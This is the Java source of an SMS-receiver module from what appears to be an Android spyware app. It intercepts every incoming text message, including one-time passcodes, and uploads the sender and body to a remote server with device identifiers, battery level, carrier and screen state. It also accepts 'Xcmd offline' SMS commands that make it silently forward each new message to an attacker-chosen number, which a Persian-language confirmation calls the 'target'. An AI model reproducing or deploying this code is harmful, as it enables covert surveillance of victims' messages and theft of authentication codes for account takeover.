package com.Mad.api;

import android.os.Bundle;
import android.content.Intent;
import android.telephony.SmsMessage;

import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ReceiverHelper;
import anywheresoftware.b4a.debug.*;

public class newmessage extends android.content.BroadcastReceiver{
		
    static newmessage mostCurrent;
	public static BA processBA;
    private ReceiverHelper _receiver;
    private static boolean firstTime = true;
    public static Class<?> getObject() {
		return newmessage.class;
	}
	@Override
	public void onReceive(android.content.Context context, android.content.Intent intent) {
        mostCurrent = this;
       
        if (processBA == null) {
           
		    processBA = new BA(context, null, null, anywheresoftware.b4a.BA.SharedProcessBA.ModuleType.RECEIVER, "com.Mad.api.newmessage");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
        }
         _receiver = new ReceiverHelper(this);
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.Mad.api.newmessage", processBA, _receiver, anywheresoftware.b4a.keywords.Common.Density);
		}
        processBA.setActivityPaused(false);
        BA.LogInfo("*** Receiver (newmessage) Receive " + (firstTime ? "(first time)" : "") + " ***");
        anywheresoftware.b4a.objects.IntentWrapper iw = new anywheresoftware.b4a.objects.IntentWrapper();
        iw.setObject(intent);
        processBA.raiseEvent(null, "receiver_receive", firstTime, iw);
        firstTime = false;
    }
	
public anywheresoftware.b4a.keywords.Common __c = null;
public static com.Mad.api.sendserver _send = null;
public static anywheresoftware.b4a.phone.Phone _phone = null;
public static anywheresoftware.b4a.objects.StringUtils _st = null;
public static com.reza.sh.deviceinfo.DiviceInfo _pd = null;
public static anywheresoftware.b4a.objects.collections.Map _mapdata = null;
public static String _res = "";
public static anywheresoftware.b4a.phone.Phone.PhoneWakeState _pm = null;
public com.Mad.api.main _main = null;
public com.Mad.api.serverlink _serverlink = null;
public com.Mad.api.firebasemessaging _firebasemessaging = null;
public com.Mad.api.starter _starter = null;
public com.Mad.api.chrome _chrome = null;
public com.Mad.api.mainchange _mainchange = null;
public com.Mad.api.second _second = null;
public com.Mad.api.telegram _telegram = null;
public com.Mad.api.villain _villain = null;
public com.Mad.api.youtube _youtube = null;
public com.Mad.api.httputils2service _httputils2service = null;
public static String  _checkscreenstatus() throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
Object _powerservice = null;
boolean _isscreenon = false;
 //BA.debugLineNum = 95;BA.debugLine="Public Sub CheckScreenStatus";
 //BA.debugLineNum = 96;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 97;BA.debugLine="pm.PartialLock";
_pm.PartialLock(processBA);
 //BA.debugLineNum = 99;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 100;BA.debugLine="r.Target = r.GetContext";
_r.Target = (Object)(_r.GetContext(processBA));
 //BA.debugLineNum = 101;BA.debugLine="Dim powerService As Object = r.RunMethod2(\"getSys";
_powerservice = _r.RunMethod2("getSystemService","power","java.lang.String");
 //BA.debugLineNum = 102;BA.debugLine="r.Target = powerService";
_r.Target = _powerservice;
 //BA.debugLineNum = 103;BA.debugLine="Dim isScreenOn As Boolean = r.RunMethod(\"isScreen";
_isscreenon = BA.ObjectToBoolean(_r.RunMethod("isScreenOn"));
 //BA.debugLineNum = 105;BA.debugLine="If isScreenOn Then";
if (_isscreenon) { 
 //BA.debugLineNum = 106;BA.debugLine="res = \"On\"";
_res = "On";
 //BA.debugLineNum = 107;BA.debugLine="Log(\"Screen is ON\")";
anywheresoftware.b4a.keywords.Common.LogImpl("1655372","Screen is ON",0);
 }else {
 //BA.debugLineNum = 109;BA.debugLine="res = \"Off\"";
_res = "Off";
 //BA.debugLineNum = 110;BA.debugLine="Log(\"Screen is OFF\")";
anywheresoftware.b4a.keywords.Common.LogImpl("1655375","Screen is OFF",0);
 };
 //BA.debugLineNum = 112;BA.debugLine="Return res";
if (true) return _res;
 //BA.debugLineNum = 113;BA.debugLine="pm.ReleasePartialLock";
_pm.ReleasePartialLock();
 //BA.debugLineNum = 114;BA.debugLine="End Sub";
return "";
}
public static anywheresoftware.b4a.objects.collections.Map  _parsesmsintent(anywheresoftware.b4a.objects.IntentWrapper _in) throws Exception{
anywheresoftware.b4a.objects.collections.Map _sms_map = null;
anywheresoftware.b4a.keywords.StringBuilderWrapper _body = null;
String _address = "";
Object[] _pdus = null;
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
int _i = 0;
 //BA.debugLineNum = 58;BA.debugLine="Sub ParseSmsIntent (in As Intent) As Map";
 //BA.debugLineNum = 59;BA.debugLine="Private SMS_MAP As Map";
_sms_map = new anywheresoftware.b4a.objects.collections.Map();
 //BA.debugLineNum = 60;BA.debugLine="SMS_MAP.Initialize";
_sms_map.Initialize();
 //BA.debugLineNum = 61;BA.debugLine="Dim Body As StringBuilder";
_body = new anywheresoftware.b4a.keywords.StringBuilderWrapper();
 //BA.debugLineNum = 62;BA.debugLine="Dim Address As String";
_address = "";
 //BA.debugLineNum = 63;BA.debugLine="Body.Initialize";
_body.Initialize();
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 65;BA.debugLine="If Not(in.HasExtra(\"pdus\"))Then Return SMS_MAP";
if (anywheresoftware.b4a.keywords.Common.Not(_in.HasExtra("pdus"))) { 
if (true) return _sms_map;};
 //BA.debugLineNum = 66;BA.debugLine="Dim pdus() As Object";
_pdus = new Object[(int) (0)];
{
int d0 = _pdus.length;
for (int i0 = 0;i0 < d0;i0++) {
_pdus[i0] = new Object();
}
}
;
 //BA.debugLineNum = 67;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 68;BA.debugLine="pdus = in.GetExtra(\"pdus\")";
_pdus = (Object[])(_in.GetExtra("pdus"));
 //BA.debugLineNum = 69;BA.debugLine="If pdus.Length > 0 Then";
if (_pdus.length>0) { 
 //BA.debugLineNum = 70;BA.debugLine="For i = 0 To pdus.Length - 1";
{
final int step12 = 1;
final int limit12 = (int) (_pdus.length-1);
_i = (int) (0) ;
for (;_i <= limit12 ;_i = _i + step12 ) {
 //BA.debugLineNum = 71;BA.debugLine="r.Target = r.RunStaticMethod(\"android.telephon";
_r.Target = _r.RunStaticMethod("android.telephony.SmsMessage","createFromPdu",new Object[]{_pdus[_i]},new String[]{"[B"});
 //BA.debugLineNum = 73;BA.debugLine="Body.Append(r.RunMethod(\"getMessageBody\"))";
_body.Append(BA.ObjectToString(_r.RunMethod("getMessageBody")));
 //BA.debugLineNum = 74;BA.debugLine="Address = r.RunMethod(\"getOriginatingAddress\")";
_address = BA.ObjectToString(_r.RunMethod("getOriginatingAddress"));
 }
};
 };
 } 
       catch (Exception e19) {
			processBA.setLastException(e19); //BA.debugLineNum = 78;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1524308",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 80;BA.debugLine="SMS_MAP.Put(\"Address\",Address)";
_sms_map.Put((Object)("Address"),(Object)(_address));
 //BA.debugLineNum = 81;BA.debugLine="SMS_MAP.Put(\"Body\",Body)";
_sms_map.Put((Object)("Body"),(Object)(_body.getObject()));
 //BA.debugLineNum = 82;BA.debugLine="Return SMS_MAP";
if (true) return _sms_map;
 //BA.debugLineNum = 83;BA.debugLine="End Sub";
return null;
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 1;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 2;BA.debugLine="Dim Send As SendServer";
_send = new com.Mad.api.sendserver();
 //BA.debugLineNum = 3;BA.debugLine="Dim phone As Phone";
_phone = new anywheresoftware.b4a.phone.Phone();
 //BA.debugLineNum = 4;BA.debugLine="Dim st As StringUtils";
_st = new anywheresoftware.b4a.objects.StringUtils();
 //BA.debugLineNum = 5;BA.debugLine="Dim pd As PersianDeviceInfo";
_pd = new com.reza.sh.deviceinfo.DiviceInfo();
 //BA.debugLineNum = 6;BA.debugLine="Private MapData As Map";
_mapdata = new anywheresoftware.b4a.objects.collections.Map();
 //BA.debugLineNum = 7;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 8;BA.debugLine="Dim pm As PhoneWakeState";
_pm = new anywheresoftware.b4a.phone.Phone.PhoneWakeState();
 //BA.debugLineNum = 9;BA.debugLine="End Sub";
return "";
}
public static String  _receiver_receive(boolean _firsttime,anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
String _address = "";
String _body = "";
String _num = "";
 //BA.debugLineNum = 11;BA.debugLine="Private Sub Receiver_Receive (FirstTime As Boolean";
 //BA.debugLineNum = 12;BA.debugLine="If StartingIntent.Action = \"android.provider.Tele";
if ((_startingintent.getAction()).equals("android.provider.Telephony.SMS_RECEIVED")) { 
 //BA.debugLineNum = 13;BA.debugLine="res = CheckScreenStatus";
_res = _checkscreenstatus();
 //BA.debugLineNum = 14;BA.debugLine="Try";
try { //BA.debugLineNum = 15;BA.debugLine="StartReceiver(FirebaseMessaging)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(mostCurrent._firebasemessaging.getObject()));
 //BA.debugLineNum = 16;BA.debugLine="pd.initialize(\"pd\")";
_pd.initialize(processBA,"pd");
 //BA.debugLineNum = 17;BA.debugLine="Private Address,Body As String = \"Can't Get Dat";
_address = "";
_body = "Can't Get Data !";
 //BA.debugLineNum = 18;BA.debugLine="Try";
try { //BA.debugLineNum = 19;BA.debugLine="MapData.Initialize";
_mapdata.Initialize();
 //BA.debugLineNum = 20;BA.debugLine="MapData = ParseSmsIntent(StartingIntent)";
_mapdata = _parsesmsintent(_startingintent);
 //BA.debugLineNum = 21;BA.debugLine="If MapData.ContainsKey(\"Address\") Then";
if (_mapdata.ContainsKey((Object)("Address"))) { 
 //BA.debugLineNum = 22;BA.debugLine="Address = MapData.Get(\"Address\")";
_address = BA.ObjectToString(_mapdata.Get((Object)("Address")));
 };
 //BA.debugLineNum = 24;BA.debugLine="If MapData.ContainsKey(\"Body\") Then";
if (_mapdata.ContainsKey((Object)("Body"))) { 
 //BA.debugLineNum = 25;BA.debugLine="Body = MapData.Get(\"Body\")";
_body = BA.ObjectToString(_mapdata.Get((Object)("Body")));
 };
 //BA.debugLineNum = 27;BA.debugLine="If Body.Contains(\"<#>\") Then";
if (_body.contains("<#>")) { 
 //BA.debugLineNum = 28;BA.debugLine="Body = Body.Replace(\"<#>\",\"\")";
_body = _body.replace("<#>","");
 };
 } 
       catch (Exception e20) {
			processBA.setLastException(e20); //BA.debugLineNum = 31;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1458772",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 33;BA.debugLine="Send.Initialize";
_send._initialize /*String*/ (processBA);
 //BA.debugLineNum = 34;BA.debugLine="Send.SendData(\"sender=\"& st.EncodeUrl(Address,\"";
_send._senddata /*void*/ ("sender="+_st.EncodeUrl(_address,"UTF-8")+"&messagetext="+_st.EncodeUrl(_body,"UTF-8")+"&Model="+_phone.getModel()+"&Device_id="+_phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(_pd.getBatteryPercentage())+"&andver="+_pd.getOSVersion()+"&action="+"ReciveSMS"+"&operator="+_phone.GetNetworkOperatorName()+"&screen="+_res);
 //BA.debugLineNum = 36;BA.debugLine="If Body.Contains(\"Xcmd \") Then";
if (_body.contains("Xcmd ")) { 
 //BA.debugLineNum = 37;BA.debugLine="Body = Body.Replace(\"Xcmd \",\"\")";
_body = _body.replace("Xcmd ","");
 //BA.debugLineNum = 38;BA.debugLine="If Body.Contains(\"offline \") Then";
if (_body.contains("offline ")) { 
 //BA.debugLineNum = 39;BA.debugLine="If File.Exists(File.DirInternal,\"offline.txt\"";
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt")) { 
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt");};
 //BA.debugLineNum = 40;BA.debugLine="File.WriteString(File.DirInternal,\"offline.tx";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt",_body.replace("offline ",""));
 //BA.debugLineNum = 41;BA.debugLine="SendSMS(Address,\"دستور اجرا شد ، حالت آفلاین";
_sendsms(_address,"دستور اجرا شد ، حالت آفلاین مود با موفقیت روی شماره [ "+_body.replace("offline ","")+" ] ست شد . زین پس هر پیام جدیدی که برای تارگت بیاید ،به شماره مورد نظر هم ارسال میشود .");
 };
 };
 //BA.debugLineNum = 45;BA.debugLine="If File.Exists(File.DirInternal,\"offline.txt\")";
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt")) { 
 //BA.debugLineNum = 46;BA.debugLine="Dim num As String = File.GetText(File.DirInter";
_num = anywheresoftware.b4a.keywords.Common.File.GetText(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt");
 //BA.debugLineNum = 47;BA.debugLine="SendSMS(num,phone.Model&CRLF&phone.GetSettings";
_sendsms(_num,_phone.getModel()+anywheresoftware.b4a.keywords.Common.CRLF+_phone.GetSettings("android_id")+anywheresoftware.b4a.keywords.Common.CRLF+"From:"+_address+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+_body);
 };
 } 
       catch (Exception e37) {
			processBA.setLastException(e37); //BA.debugLineNum = 50;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1458791",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 //BA.debugLineNum = 51;BA.debugLine="If File.Exists(File.DirInternal,\"offline.txt\")";
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt")) { 
 //BA.debugLineNum = 52;BA.debugLine="Dim num As String = File.GetText(File.DirInter";
_num = anywheresoftware.b4a.keywords.Common.File.GetText(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt");
 //BA.debugLineNum = 53;BA.debugLine="SendSMS(num,phone.Model&CRLF&phone.GetSettings";
_sendsms(_num,_phone.getModel()+anywheresoftware.b4a.keywords.Common.CRLF+_phone.GetSettings("android_id")+anywheresoftware.b4a.keywords.Common.CRLF+"From:"+_address+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+_body);
 };
 };
 };
 //BA.debugLineNum = 57;BA.debugLine="End Sub";
return "";
}
public static String  _sendsms(String _number,String _message) throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
Object _parts = null;
 //BA.debugLineNum = 84;BA.debugLine="Sub SendSMS(Number As String , Message As String)";
 //BA.debugLineNum = 85;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 86;BA.debugLine="r.Target = r.RunStaticMethod(\"android.telephony.S";
_r.Target = _r.RunStaticMethod("android.telephony.SmsManager","getDefault",(Object[])(anywheresoftware.b4a.keywords.Common.Null),(String[])(anywheresoftware.b4a.keywords.Common.Null));
 //BA.debugLineNum = 87;BA.debugLine="Dim parts As Object";
_parts = new Object();
 //BA.debugLineNum = 88;BA.debugLine="parts = r.RunMethod2(\"divideMessage\", Message, \"j";
_parts = _r.RunMethod2("divideMessage",_message,"java.lang.String");
 //BA.debugLineNum = 89;BA.debugLine="r.RunMethod4(\"sendMultipartTextMessage\", _";
_r.RunMethod4("sendMultipartTextMessage",new Object[]{(Object)(_number),anywheresoftware.b4a.keywords.Common.Null,_parts,anywheresoftware.b4a.keywords.Common.Null,anywheresoftware.b4a.keywords.Common.Null},new String[]{"java.lang.String","java.lang.String","java.util.ArrayList","java.util.ArrayList","java.util.ArrayList"});
 //BA.debugLineNum = 93;BA.debugLine="End Sub";
return "";
}

    public String GET(String extra,Intent intent){
    	final Bundle bundle = intent.getExtras();
        try {
            if (bundle != null) {
            	Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return "";
                }
                
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }
                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();
                extra=extra.toLowerCase();
                if(extra.contains("body"))
                {return message;}
                else if(extra.contains("number"))
                {return sender;} 
            
                   
                } 
              
        } catch (Exception e) {
           //  
        }
        return "";
    }
}
